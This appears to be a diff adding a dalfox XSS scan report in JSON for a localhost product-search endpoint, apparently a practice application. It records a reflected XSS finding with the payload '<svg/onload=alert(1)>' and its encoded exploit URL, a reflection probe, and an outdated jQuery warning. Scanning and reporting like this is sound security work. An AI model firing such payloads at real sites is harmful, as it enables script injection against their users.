@@ -1,0 +1,66 @@
+{
+  "meta": {
+    "dalfox_version": "3.2.2",
+    "targets": ["http://localhost:3001/rest/products/search?q="],
+    "scan_duration_ms": 4210,
+    "total_requests": 512,
+    "findings_count": 3,
+    "target_summary": [
+      {
+        "url": "http://localhost:3001/rest/products/search?q=",
+        "status": "findings",
+        "findings_count": 3
+      }
+    ],
+    "incomplete": false
+  },
+  "findings": [
+    {
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it",
+      "inject_type": "inHTML",
+      "detection_method": "reflection",
+      "method": "GET",
+      "data": "http://localhost:3001/rest/products/search?q=%3Csvg%2Fonload%3Dalert%281%29%3E",
+      "param": "q",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in an executable position",
+      "cwe": "CWE-79",
+      "severity": "High",
+      "message_id": 200,
+      "message_str": "Reflected XSS found",
+      "confidence": "high",
+      "confidence_reason": "URL-carried source; inline script permitted"
+    },
+    {
+      "type": "R",
+      "type_description": "Reflected - the payload came back in the response",
+      "inject_type": "inHTML",
+      "detection_method": "reflection",
+      "method": "GET",
+      "data": "http://localhost:3001/rest/products/search?q=dlx1",
+      "param": "q",
+      "payload": "dlx1",
+      "evidence": "payload reflected in response",
+      "cwe": "CWE-79",
+      "severity": "Info",
+      "message_id": 100,
+      "message_str": "Reflection found"
+    },
+    {
+      "type": "I",
+      "type_description": "Informational - outdated component",
+      "inject_type": "OutdatedComponent",
+      "detection_method": "library",
+      "method": "GET",
+      "data": "http://localhost:3001/",
+      "param": "-",
+      "payload": "",
+      "evidence": "jquery 2.1.4 (known-vulnerable)",
+      "cwe": "CWE-1104",
+      "severity": "Low",
+      "message_id": 0,
+      "message_str": "Outdated library"
+    }
+  ]
+}
